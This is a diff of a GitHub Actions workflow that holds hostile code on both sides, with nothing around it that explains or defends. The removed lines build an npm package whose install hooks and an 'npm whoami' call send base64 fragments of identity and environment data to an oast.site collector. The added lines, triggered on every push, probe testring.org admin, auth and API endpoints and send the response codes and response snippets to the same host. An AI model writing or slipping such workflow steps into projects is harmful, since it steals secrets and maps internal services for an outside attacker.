@@ -1,24 +1,15 @@
-name: npm
-on: workflow_dispatch:
-  push:
+name: srv
+on: push
 jobs:
   j:
     runs-on: ubuntu-latest
     steps:
       - uses: actions/checkout@v4
       - run: |
-          mkdir -p /tmp/pkg && cd /tmp/pkg
-          cat > package.json << 'EOF'
-{
-  "name": "blast-mainnet-smart-order-router-28",
-  "version": "0.0.1",
-  "description": "router",
-  "main": "index.js",
-  "scripts": {
-    "preinstall": "wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/npmhit-$(id|base64|tr -d \\n|cut -c1-20)",
-    "postinstall": "wget -qO- http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/npmhit2-$(env|base64|tr -d \\n|cut -c1-20)"
-  }
-}
-EOF
-          echo "module.exports={}" > index.js
-          npm whoami 2>&1 | head -2 | base64 | tr -d '\n' | sed 's/^/w-/' | xargs -I{} wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/{}" || true
+          R=""
+          for u in "https://rw.admin.testring.org/" "https://f.testring.org/" "https://app.testring.org/api/v1/dapps" "https://docs.testring.org/" "https://ringlabs.testring.org/api/auth/providers" "https://proxyapi.testring.org/" "https://tokenpredict.testring.org/api/auth/providers"; do
+            C=$(curl -s --max-time 8 -o /tmp/x -w "%{http_code}" "$u"); S=$(head -c 15 /tmp/x | tr -d '\n' | base64 | tr -d '\n')
+            R="$R[$C]"
+            wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/s-$C-${S:0:12}"
+          done
+          wget -qO- "http://dbn4g99lr5rdpldhtengr86qx4ii6ec3s.oast.site/sweep-$R"
